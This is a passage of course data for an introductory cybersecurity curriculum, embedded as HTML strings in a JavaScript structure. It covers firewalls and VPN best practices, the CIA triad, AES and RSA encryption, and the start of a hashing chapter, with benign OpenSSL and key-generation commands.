                  <li>Access control — allow or deny based on rules</li>
                  <li>Network segmentation — separate trusted and untrusted zones</li>
                  <li>Logging and monitoring — record traffic for audits</li>
                  <li>Threat prevention — block known-malicious traffic</li>
                  <li>Policy enforcement — enforce organisational security policy</li>
                </ul>

                <h4 class="sub-h">Types of Firewalls</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span><span>Example</span></div>
                  <div class="tool-row"><span>Packet Filtering</span><span>Inspect IP/port/protocol</span><span>Router ACLs</span></div>
                  <div class="tool-row"><span>Stateful</span><span>Tracks connection state</span><span>Most modern firewalls</span></div>
                  <div class="tool-row"><span>Application Layer</span><span>Inspects payloads (L7)</span><span>WAF, proxy</span></div>
                  <div class="tool-row"><span>NGFW</span><span>Stateful + app + IPS + intel</span><span>Palo Alto, Fortinet</span></div>
                  <div class="tool-row"><span>Cloud Firewall</span><span>Delivered as a service</span><span>AWS, Azure</span></div>
                  <div class="tool-row"><span>Host-Based</span><span>Software on hosts</span><span>Windows Firewall, iptables</span></div>
                </div>

                <h4 class="sub-h">Firewall Rules</h4>
                <p>Rules specify: source IP, destination IP, source port, destination port, protocol, and action (Allow / Deny / Log). Rules are processed top-down — first match wins. <strong>Default deny</strong> is best practice.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">VPN Attacks</span>
                    <ul>
                      <li>Credential brute force on VPN login portals</li>
                      <li>Known CVEs in VPN appliances (Pulse Secure, Fortinet)</li>
                      <li>DNS / IP leaks exposing real IP</li>
                      <li>MITM if misconfigured or weak encryption</li>
                      <li>Account hijacking via phishing</li>
                      <li>Split tunneling bypassing corporate security</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Firewall Attacks</span>
                    <ul>
                      <li>Rule bypass — misconfigured any-any allow</li>
                      <li>Port knocking to hide or bypass filters</li>
                      <li>Fragmentation attacks bypassing filters</li>
                      <li>IP spoofing trusted source IPs</li>
                      <li>Application-layer evasion via encoding</li>
                      <li>Firewall DoS to exhaust resources</li>
                      <li>Insider abuse of allowed rules</li>
                    </ul>
                  </div>
                </div>

                <div class="cia-grid" style="margin-top: 20px;">
                  <div class="cia-defense">
                    <span class="cia-label defense">VPN Best Practices</span>
                    <ul>
                      <li>Strong encryption — AES-256, SHA-256</li>
                      <li>Modern protocols — WireGuard, OpenVPN, IKEv2</li>
                      <li>Enable MFA for VPN access</li>
                      <li>Certificate-based authentication</li>
                      <li>Patch VPN appliances regularly</li>
                      <li>Disable split tunneling if not needed</li>
                      <li>Monitor VPN logs for anomalies</li>
                      <li>Consider ZTNA over traditional VPN</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Firewall Best Practices</span>
                    <ul>
                      <li>Default deny — allow only what's needed</li>
                      <li>Least privilege — minimal rules</li>
                      <li>Regular audits of rule sets</li>
                      <li>Logging to SIEM</li>
                      <li>Change management for rule updates</li>
                      <li>Segmentation — DMZ + internal firewalls</li>
                      <li>Firmware patch management</li>
                      <li>HA pairs for critical firewalls</li>
                      <li>Periodic penetration testing</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>VPN creates an encrypted tunnel for secure communication.</li>
                  <li>Types: Remote Access, Site-to-Site, SSL, IPsec, MPLS.</li>
                  <li>Protocols: OpenVPN, WireGuard, IKEv2, L2TP/IPsec.</li>
                  <li>Firewalls control traffic based on rules; default deny is best practice.</li>
                  <li>Types: Packet Filter, Stateful, Application, NGFW, Cloud, Host-based.</li>
                  <li>Attacks: VPN brute force, firewall bypass, tunneling, spoofing.</li>
                  <li>Defenses: strong encryption, MFA, patching, rule audits, segmentation, monitoring.</li>
                  <li>VPN + firewall together provide layered perimeter and remote-access security.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://openvpn.net/" target="_blank" rel="noopener">OpenVPN — Open-source VPN</a>
                  <a href="https://www.wireguard.com/" target="_blank" rel="noopener">WireGuard — Modern VPN protocol</a>
                  <a href="https://www.pfsense.org/" target="_blank" rel="noopener">pfSense — Firewall / VPN appliance</a>
                  <a href="https://www.netfilter.org/" target="_blank" rel="noopener">iptables — Linux firewall</a>
                  <a href="https://www.dnsleaktest.com/" target="_blank" rel="noopener">DNS Leak Test — VPN privacy check</a>
                </div>
              </section>
            ` },
        ],
      },

      // ============================================================
      // MODULE 2 — CRYPTOGRAPHY
      // ============================================================
      {
        id: "m2",
        type: "part",
        number: 2,
        title: "Security & Cryptography",
        icon: "🔐",
        blurb: "Cryptography is the mathematics of trust. This module covers how we keep secrets secret, verify integrity, and prove identity — from symmetric ciphers to modern zero-trust architecture.",
        chapters: [
                    { id: "2.1", title: "CIA Triad Applied & Encryption Fundamentals", pages: "197-208", read: 14,
            build: "Analyze three real crypto failures and identify which pillar broke.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>The <strong>CIA Triad</strong> — Confidentiality, Integrity, and Availability — is the foundational model of information security. Every control, attack, and defence maps back to one of these three pillars. A security breach occurs whenever a pillar is violated.</p>
                <p><strong>Encryption</strong> converts plaintext into ciphertext using an algorithm and a key; <strong>decryption</strong> reverses it. Encryption protects confidentiality, while hashing and digital signatures protect integrity and authenticity.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Scenario — The Hospital</h3>
                <p>A hospital stores patient records in a database. Consider the three pillars in action:</p>
                <ul class="content-list">
                  <li><strong>Confidentiality</strong> — Only authorised doctors and nurses can view patient data.</li>
                  <li><strong>Integrity</strong> — Records must be accurate and unaltered without authorisation.</li>
                  <li><strong>Availability</strong> — The system must run 24/7 for emergency care.</li>
                </ul>
                <p>If a hacker steals records, confidentiality is breached. If a virus alters lab results, integrity is breached. If ransomware locks the system, availability is breached.</p>
                <p><strong>Encryption in action:</strong> When you send a WhatsApp message, it is end-to-end encrypted — plaintext becomes ciphertext on your device, transmitted over the Internet, and decrypted only on the recipient's device. Even WhatsApp servers cannot read it.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. The CIA Triad in Depth</h3>

                <figure class="content-figure">
                  <img src="./img/cia-triad-deep.png" alt="CIA Triad — Confidentiality, Integrity, Availability with controls and threats" />
                  <figcaption>Figure 1.1 — The CIA Triad in practice. Each pillar has distinct threats and corresponding controls; the pillars are interdependent.</figcaption>
                </figure>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🔐</span>
                    <h4>Confidentiality</h4>
                  </div>
                  <p><strong>Definition:</strong> Information is accessible only to those authorised to have access.</p>
                  <p><strong>Purpose:</strong> Protect sensitive data from unauthorised disclosure.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Threats</span>
                      <ul>
                        <li>Data breaches</li>
                        <li>Eavesdropping</li>
                        <li>Phishing and social engineering</li>
                        <li>Insider threats</li>
                        <li>Misconfigured access controls</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Controls</span>
                      <ul>
                        <li>Encryption at rest and in transit</li>
                        <li>Access control lists (ACLs)</li>
                        <li>Multi-Factor Authentication</li>
                        <li>Data classification</li>
                        <li>Least privilege</li>
                        <li>Physical security and user training</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🧱</span>
                    <h4>Integrity</h4>
                  </div>
                  <p><strong>Definition:</strong> Data remains accurate, complete, and unaltered by unauthorised parties.</p>
                  <p><strong>Purpose:</strong> Maintain trust in data and systems.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Threats</span>
                      <ul>
                        <li>Man-in-the-Middle (MITM)</li>
                        <li>Malware</li>
                        <li>Unauthorised modifications</li>
                        <li>Human error</li>
                        <li>Hardware failures</li>
                        <li>Software bugs</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Controls</span>
                      <ul>
                        <li>Cryptographic hashing (SHA-256)</li>
                        <li>Digital signatures</li>
                        <li>Checksums</li>
                        <li>Version control</li>
                        <li>Access control</li>
                        <li>Audit logs and File Integrity Monitoring (FIM)</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">⚡</span>
                    <h4>Availability</h4>
                  </div>
                  <p><strong>Definition:</strong> Systems, networks, and data are accessible to authorised users when needed.</p>
                  <p><strong>Purpose:</strong> Prevent disruption of services.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Threats</span>
                      <ul>
                        <li>DoS and DDoS attacks</li>
                        <li>Ransomware</li>
                        <li>Power outages</li>
                        <li>Hardware failures</li>
                        <li>Natural disasters</li>
                        <li>Human error</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Controls</span>
                      <ul>
                        <li>Redundancy (hardware, network, power)</li>
                        <li>Offline and offsite backups</li>
                        <li>DDoS protection</li>
                        <li>Load balancing</li>
                        <li>Disaster recovery plan (DRP)</li>
                        <li>Business continuity plan (BCP)</li>
                        <li>Regular maintenance and patching</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <h4 class="sub-h">Interrelation of CIA</h4>
                <p>The three pillars are interdependent. Encryption (confidentiality) can be broken if integrity is compromised — an attacker modifies ciphertext. Availability can be lost if integrity is breached — ransomware encrypts files. Confidentiality can be lost if availability is breached — a DDoS forces a shutdown that exposes data. A balanced strategy addresses all three simultaneously.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Encryption &amp; Decryption Fundamentals</h3>

                <h4 class="sub-h">Core Terminology</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Term</span><span>Meaning</span></div>
                  <div class="tool-row"><span>Plaintext</span><span>Original, readable data</span></div>
                  <div class="tool-row"><span>Ciphertext</span><span>Encrypted, unreadable data</span></div>
                  <div class="tool-row"><span>Encryption</span><span>Plaintext → Ciphertext</span></div>
                  <div class="tool-row"><span>Decryption</span><span>Ciphertext → Plaintext</span></div>
                  <div class="tool-row"><span>Key</span><span>Secret value used by the algorithm</span></div>
                  <div class="tool-row"><span>Algorithm</span><span>Mathematical procedure (AES, RSA)</span></div>
                  <div class="tool-row"><span>Cipher</span><span>Algorithm + key combination</span></div>
                </div>

                <h4 class="sub-h">Symmetric Encryption</h4>
                <p>Same key for encryption and decryption. Examples: AES, DES, 3DES, Blowfish, ChaCha20.</p>
                <p><strong>Advantages:</strong> fast, efficient for large data. <strong>Disadvantages:</strong> key distribution problem; number of keys grows as n(n−1)/2.</p>
                <p><strong>Use cases:</strong> file encryption, disk encryption, VPN tunnels, TLS session data.</p>

                <h4 class="sub-h">Asymmetric Encryption</h4>
                <p>Two keys — public for encryption, private for decryption. Examples: RSA, ECC, Diffie-Hellman, DSA.</p>
                <p><strong>Advantages:</strong> solves key distribution; enables digital signatures and non-repudiation. <strong>Disadvantages:</strong> slower; computationally intensive.</p>
                <p><strong>Use cases:</strong> key exchange, digital signatures, TLS certificates, PGP email.</p>

                <h4 class="sub-h">Hybrid Encryption</h4>
                <p>Most modern systems use both: asymmetric encryption to exchange a symmetric session key, then symmetric encryption for bulk data. TLS is the classic example.</p>

                <h4 class="sub-h">Encryption Modes</h4>
                <ul class="content-list">
                  <li><strong>ECB</strong> — Weak; patterns visible</li>
                  <li><strong>CBC</strong> — Uses IV; better than ECB</li>
                  <li><strong>CFB / OFB / CTR</strong> — Stream-like modes</li>
                  <li><strong>GCM</strong> — Confidentiality + integrity (recommended)</li>
                  <li><strong>CCM</strong> — CTR + CBC-MAC</li>
                </ul>

                <h4 class="sub-h">Key Management</h4>
                <ul class="content-list">
                  <li><strong>Generation</strong> — Cryptographically secure RNGs</li>
                  <li><strong>Storage</strong> — HSMs, key vaults</li>
                  <li><strong>Distribution</strong> — Secure channels, key-exchange protocols</li>
                  <li><strong>Rotation</strong> — Regular changes</li>
                  <li><strong>Revocation</strong> — Invalidate compromised keys</li>
                  <li><strong>Destruction</strong> — Secure deletion when no longer needed</li>
                </ul>

                <h4 class="sub-h">In Transit vs At Rest</h4>
                <p><strong>In transit:</strong> TLS, VPN, SSH, IPsec. <strong>At rest:</strong> Full-disk encryption (BitLocker, LUKS), database encryption, file encryption.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attacks on CIA</span>
                    <ul>
                      <li><strong>Confidentiality</strong> — eavesdropping, cryptanalysis, side-channel, key theft, downgrade attacks</li>
                      <li><strong>Integrity</strong> — MITM, hash collisions, signature forgery, malware, replay attacks</li>
                      <li><strong>Availability</strong> — DDoS, ransomware, physical attacks, insider sabotage, resource exhaustion</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Attacks on Encryption</span>
                    <ul>
                      <li><strong>Brute Force</strong> — Trying all possible keys</li>
                      <li><strong>Dictionary Attack</strong> — Trying common passwords</li>
                      <li><strong>Rainbow Tables</strong> — Precomputed hash tables</li>
                      <li><strong>Birthday Attack</strong> — Exploiting hash collisions</li>
                      <li><strong>MITM</strong> — Intercepting key exchange</li>
                      <li><strong>Implementation Flaws</strong> — Heartbleed, Padding Oracle</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Defensive Controls</h3>

                <h4 class="sub-h">Protecting Confidentiality</h4>
                <ul class="content-list">
                  <li>Strong encryption — AES-256, TLS 1.3</li>
                  <li>Access controls and least privilege</li>
                  <li>Multi-Factor Authentication</li>
                  <li>Encrypt data at rest and in transit</li>
                  <li>User training on phishing</li>
                  <li>Monitor for data exfiltration</li>
                </ul>

                <h4 class="sub-h">Protecting Integrity</h4>
                <ul class="content-list">
                  <li>Cryptographic hashes (SHA-256, SHA-3)</li>
                  <li>Digital signatures</li>
                  <li>File Integrity Monitoring (FIM)</li>
                  <li>Audit logging</li>
                  <li>Version control and backups</li>
                </ul>

                <h4 class="sub-h">Protecting Availability</h4>
                <ul class="content-list">
                  <li>Redundancy (N+1, N+2)</li>
                  <li>DDoS protection services</li>
                  <li>Offline, offsite backups</li>
                  <li>Tested disaster recovery plans</li>
                  <li>Load balancing and health monitoring</li>
                  <li>Regular patching</li>
                </ul>

                <h4 class="sub-h">Encryption Best Practices</h4>
                <ul class="content-list">
                  <li>Use proven algorithms (AES, RSA, ECC)</li>
                  <li>Adequate key lengths (AES-256, RSA-2048+)</li>
                  <li>Secure modes (GCM, CBC with random IV)</li>
                  <li>Never hardcode keys — use HSMs</li>
                  <li>Rotate keys; use forward secrecy (ECDHE)</li>
                  <li>Disable SSLv3, TLS 1.0/1.1</li>
                  <li>Validate certificates; HTTPS everywhere</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Essential Commands</h3>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Encryption &amp; hashing (OpenSSL)</span></div>
                  <pre><code># AES-256-CBC file encryption
openssl enc -aes-256-cbc -salt -in plain.txt -out cipher.txt

# Decrypt
openssl enc -d -aes-256-cbc -in cipher.txt -out plain.txt

# SHA-256 hash
openssl dgst -sha256 file.txt

# GPG symmetric / asymmetric
gpg -c file.txt
gpg -e -r recipient file.txt</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>The CIA Triad — Confidentiality, Integrity, Availability — is the foundation of all security work.</li>
                  <li>Confidentiality protects against unauthorised disclosure; integrity ensures accuracy; availability ensures access.</li>
                  <li>Encryption converts plaintext to ciphertext; decryption reverses it.</li>
                  <li>Symmetric uses one key; asymmetric uses a public/private key pair.</li>
                  <li>Hybrid encryption combines both for efficiency and security.</li>
                  <li>Key management is critical — generation, storage, rotation, revocation.</li>
                  <li>Defences span strong encryption, access controls, hashing, redundancy, and monitoring.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.openssl.org/" target="_blank" rel="noopener">OpenSSL — Cryptography toolkit</a>
                  <a href="https://gnupg.org/" target="_blank" rel="noopener">GnuPG — File and email encryption</a>
                  <a href="https://www.veracrypt.fr/" target="_blank" rel="noopener">VeraCrypt — Disk encryption</a>
                  <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef — Encryption Swiss Army knife</a>
                  <a href="https://csrc.nist.gov/projects/cryptographic-standards-and-guidelines" target="_blank" rel="noopener">NIST — Cryptographic standards</a>
                </div>
              </section>
            ` },
                    { id: "2.2", title: "Symmetric vs Asymmetric Encryption (AES & RSA)", pages: "209-224", read: 20,
            build: "Encrypt a file with AES-256 and exchange a secret with RSA.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Symmetric encryption</strong> uses the same secret key for both encryption and decryption. It is fast and efficient for bulk data but requires a secure method to share the key.</p>
                <p><strong>Asymmetric encryption</strong> (public-key cryptography) uses a mathematically related key pair — a public key for encryption and a private key for decryption. It solves key distribution but is slower.</p>
                <p><strong>AES</strong> is the global standard symmetric block cipher (NIST, 2001). <strong>RSA</strong> is a common asymmetric algorithm based on integer factorisation.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>Symmetric (VPN):</strong> Your VPN encrypts traffic with AES-256; the same key decrypts at the other end.</li>
                  <li><strong>Asymmetric (HTTPS):</strong> Your browser uses the server's public key to encrypt a session key; the server decrypts with its private key, then both use AES for the session.</li>
                  <li><strong>AES:</strong> Android File-Based Encryption (FBE) and iOS Data Protection use AES-256 to encrypt every file.</li>
                  <li><strong>RSA:</strong> When you generate an SSH key pair, the server encrypts a challenge with your public key; your private key proves identity by decrypting it.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Symmetric Encryption In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/symmetric-asymmetric.png" alt="Symmetric encryption (one shared key) vs asymmetric encryption (public/private key pair)" />
                  <figcaption>Figure 2.1 — Symmetric vs Asymmetric. Symmetric uses one shared key for both operations; asymmetric uses a mathematically linked public/private pair.</figcaption>
                </figure>

                <h4 class="sub-h">How It Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Generate a secret key using a secure RNG</div>
                  <div class="step-item"><span class="step-num">2</span> Encrypt plaintext with the key + algorithm → ciphertext</div>
                  <div class="step-item"><span class="step-num">3</span> Transmit ciphertext to the recipient</div>
                  <div class="step-item"><span class="step-num">4</span> Recipient decrypts with the same key</div>
                </div>

                <h4 class="sub-h">Common Symmetric Algorithms</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Algorithm</span><span>Key Size</span><span>Block Size</span><span>Status</span></div>
                  <div class="tool-row"><span>DES</span><span>56-bit</span><span>64-bit</span><span>Obsolete</span></div>
                  <div class="tool-row"><span>3DES</span><span>112/168-bit</span><span>64-bit</span><span>Legacy</span></div>
                  <div class="tool-row"><span>AES</span><span>128/192/256-bit</span><span>128-bit</span><span>Secure</span></div>
                  <div class="tool-row"><span>ChaCha20</span><span>256-bit</span><span>Stream</span><span>Secure, fast</span></div>
                </div>

                <h4 class="sub-h">Modes of Operation</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Mode</span><span>Notes</span></div>
                  <div class="tool-row"><span>ECB</span><span>Weak — patterns visible</span></div>
                  <div class="tool-row"><span>CBC</span><span>Good with random IV</span></div>
                  <div class="tool-row"><span>CFB / OFB / CTR</span><span>Stream-like modes</span></div>
                  <div class="tool-row"><span>GCM</span><span>Confidentiality + integrity (recommended)</span></div>
                </div>
                <p><strong>Best practice:</strong> Use AES-GCM, or AES-CBC with a random IV plus a separate HMAC.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Asymmetric Encryption In Depth</h3>

                <h4 class="sub-h">How It Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Generate a public/private key pair mathematically</div>
                  <div class="step-item"><span class="step-num">2</span> Distribute the public key freely; keep the private key secret</div>
                  <div class="step-item"><span class="step-num">3</span> Anyone can encrypt with the public key</div>
                  <div class="step-item"><span class="step-num">4</span> Only the corresponding private key can decrypt</div>
                </div>

                <h4 class="sub-h">Common Asymmetric Algorithms</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Algorithm</span><span>Based On</span><span>Key Size</span><span>Use Cases</span></div>
                  <div class="tool-row"><span>RSA</span><span>Integer factorisation</span><span>2048–4096-bit</span><span>Encryption, signatures, key exchange</span></div>
                  <div class="tool-row"><span>ECC</span><span>Elliptic curve DLP</span><span>256–521-bit</span><span>Mobile, IoT, TLS</span></div>
                  <div class="tool-row"><span>Diffie-Hellman</span><span>Discrete log</span><span>2048-bit+</span><span>Key exchange</span></div>
                  <div class="tool-row"><span>EdDSA</span><span>Edwards curves</span><span>256-bit</span><span>Modern signatures</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. AES In Depth</h3>
                <p>AES is a symmetric block cipher that processes 128-bit blocks with key sizes of 128, 192, or 256 bits. It is based on the Rijndael algorithm and is the global standard for symmetric encryption.</p>

                <h4 class="sub-h">How AES Works</h4>
                <p>AES operates on a 4×4 byte state matrix and applies multiple rounds of transformation:</p>
                <ul class="content-list">
                  <li><strong>SubBytes</strong> — non-linear substitution using S-box</li>
                  <li><strong>ShiftRows</strong> — cyclic shifting of rows</li>
                  <li><strong>MixColumns</strong> — linear transformation of columns</li>
                  <li><strong>AddRoundKey</strong> — XOR with round key</li>
                </ul>
                <p>Number of rounds: AES-128 → 10, AES-192 → 12, AES-256 → 14.</p>

                <h4 class="sub-h">Why AES Is Secure</h4>
                <ul class="content-list">
                  <li>No practical attacks against full AES</li>
                  <li>Side-channel attacks require physical access</li>
                  <li>AES-256 remains strong even against future quantum computers (Grover's algorithm only halves effective key length)</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. RSA In Depth</h3>
                <p>RSA was invented in 1977 by Rivest, Shamir, and Adleman. It is based on the difficulty of factoring the product of two large primes.</p>

                <h4 class="sub-h">Key Generation</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Choose two large primes p and q</div>
                  <div class="step-item"><span class="step-num">2</span> Compute n = p × q</div>
                  <div class="step-item"><span class="step-num">3</span> Compute φ(n) = (p−1)(q−1)</div>
                  <div class="step-item"><span class="step-num">4</span> Choose e such that gcd(e, φ(n)) = 1</div>
                  <div class="step-item"><span class="step-num">5</span> Compute d such that d × e ≡ 1 mod φ(n)</div>
                  <div class="step-item"><span class="step-num">6</span> Public: (e, n). Private: (d, n).</div>
                </div>

                <h4 class="sub-h">Encryption &amp; Decryption</h4>
                <p><strong>Encrypt:</strong> c = m<sup>e</sup> mod n. <strong>Decrypt:</strong> m = c<sup>d</sup> mod n.</p>

                <h4 class="sub-h">RSA Security Notes</h4>
                <ul class="content-list">
                  <li>Security relies on the difficulty of factoring n.</li>
                  <li>1024-bit is deprecated; 2048-bit minimum; 3072/4096-bit for long-term.</li>
                  <li>Quantum computers using Shor's algorithm could break RSA — post-quantum cryptography is under development.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Symmetric vs Asymmetric — At a Glance</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Feature</span><span>Symmetric</span><span>Asymmetric</span></div>
                  <div class="tool-row"><span>Keys</span><span>One shared key</span><span>Public + Private pair</span></div>
                  <div class="tool-row"><span>Speed</span><span>Fast</span><span>Slow</span></div>
                  <div class="tool-row"><span>Key Size</span><span>128–256 bits</span><span>2048–4096 bits</span></div>
                  <div class="tool-row"><span>Key Distribution</span><span>Difficult</span><span>Easy</span></div>
                  <div class="tool-row"><span>Scalability</span><span>n(n−1)/2 keys</span><span>n key pairs</span></div>
                  <div class="tool-row"><span>Non-Repudiation</span><span>No</span><span>Yes (signatures)</span></div>
                  <div class="tool-row"><span>Use Case</span><span>Bulk data</span><span>Key exchange, signatures</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Attack Vectors &amp; Defensive Controls</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Vectors</span>
                    <ul>
                      <li><strong>Brute Force</strong> — Infeasible against AES-256; costly against RSA-2048</li>
                      <li><strong>Side-Channel</strong> — Timing, power, cache attacks</li>
                      <li><strong>Key Theft</strong> — Malware, insider threat</li>
                      <li><strong>Weak Modes</strong> — ECB reveals patterns</li>
                      <li><strong>IV Reuse</strong> — Leaks information in CBC</li>
                      <li><strong>Quantum</strong> — Shor's algorithm threatens RSA/ECC</li>
                      <li><strong>MITM</strong> — Intercepting public-key exchange</li>
                      <li><strong>Padding Oracle</strong> — Bleichenbacher on RSA</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li>Use AES-256 or ChaCha20; RSA-2048+ or ECC Curve25519</li>
                      <li>Secure modes — GCM, CBC + HMAC</li>
                      <li>Never reuse IVs</li>
                      <li>Authenticated encryption (AEAD)</li>
                      <li>Forward secrecy via ECDHE</li>
                      <li>Store keys in HSMs; rotate keys</li>
                      <li>Validate certificates; use HSTS</li>
                      <li>Disable weak protocols and ciphers</li>
                      <li>Prepare for post-quantum cryptography</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Essential Commands</h3>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>OpenSSL — AES &amp; RSA</span></div>
                  <pre><code># AES-GCM encrypt
openssl enc -aes-256-gcm -in plain.txt -out cipher.txt

# Generate RSA private key
openssl genrsa -out private.pem 2048

# Extract public key
openssl rsa -in private.pem -pubout -out public.pem

# RSA encrypt / decrypt
openssl rsautl -encrypt -pubin -inkey public.pem -in plain.txt -out cipher.txt
openssl rsautl -decrypt -inkey private.pem -in cipher.txt -out plain.txt

# SSH key pairs
ssh-keygen -t rsa -b 4096
ssh-keygen -t ed25519</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">10. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Symmetric uses one key; asymmetric uses a public/private pair.</li>
                  <li>Symmetric is fast; asymmetric solves key distribution.</li>
                  <li>AES is the standard symmetric cipher; RSA and ECC are standard asymmetric algorithms.</li>
                  <li>Hybrid encryption combines both — TLS is the classic example.</li>
                  <li>AES operates on 128-bit blocks with 128/192/256-bit keys.</li>
                  <li>RSA security rests on integer factorisation; 2048+ bits minimum.</li>
                  <li>Defences: strong algorithms, secure modes, forward secrecy, HSM key storage.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">11. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.openssl.org/" target="_blank" rel="noopener">OpenSSL — Encryption toolkit</a>
                  <a href="https://gnupg.org/" target="_blank" rel="noopener">GnuPG — PGP encryption</a>
                  <a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">SSL Labs — TLS analysis</a>
                  <a href="https://csrc.nist.gov/projects/cryptographic-standards-and-guidelines" target="_blank" rel="noopener">NIST — Cryptographic standards</a>
                </div>
              </section>
            ` },
                    { id: "2.3", title: "Hashing, Salting, Peppering & Password Security", pages: "225-238", read: 18,
            build: "Store a password with salt + pepper in a demo database.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Hashing</strong> is a one-way cryptographic function that converts input into a fixed-length digest. It is deterministic (same input → same hash) but computationally infeasible to reverse.</p>
                <p><strong>Salting</strong> adds a unique random value to each password before hashing so identical passwords produce different hashes. <strong>Peppering</strong> adds a secret value (not stored in the database) for an extra layer.</p>
                <p><strong>Password security</strong> combines strong policies, secure storage (hashing + salt + pepper), multi-factor authentication, and user education.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>Hashing:</strong> Websites store only the hash of your password. At login, the site hashes what you entered and compares — never storing plaintext.</li>
                  <li><strong>Salting:</strong> Two users both pick <code>password123</code>. With unique salts, the stored hashes are completely different — the attacker cannot tell they share a password.</li>
                  <li><strong>Peppering:</strong> A company adds a secret pepper to every password before hashing. The pepper is kept in the application server's config, not the database. Even a database leak is not enough to crack passwords.</li>
                  <li><strong>Password policy:</strong> A bank enforces 12+ characters, mixed case, no dictionary words, MFA, and lockout after failed attempts.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Hashing In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/hashing-salting.png" alt="Password hashing pipeline — salt + pepper + Argon2/bcrypt with stored hash" />
                  <figcaption>Figure 3.1 — Password hashing pipeline. Each password receives a unique salt; a secret pepper is added; the result is hashed with a slow algorithm (Argon2id / bcrypt / scrypt). Only the salt and hash are stored.</figcaption>
                </figure>

                <h4 class="sub-h">Properties of a Cryptographic Hash</h4>
                <ul class="content-list">
                  <li><strong>Deterministic</strong> — same input, same output</li>
                  <li><strong>Fast</strong> — computes quickly</li>
                  <li><strong>One-way</strong> — cannot reverse to the input</li>
                  <li><strong>Avalanche effect</strong> — small change → completely different hash</li>
                  <li><strong>Collision-resistant</strong> — infeasible to find two inputs with same hash</li>
                  <li><strong>Fixed output size</strong> — SHA-256 always produces 256 bits</li>
                </ul>

                <h4 class="sub-h">Common Hash Algorithms</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Algorithm</span><span>Output</span><span>Status</span></div>
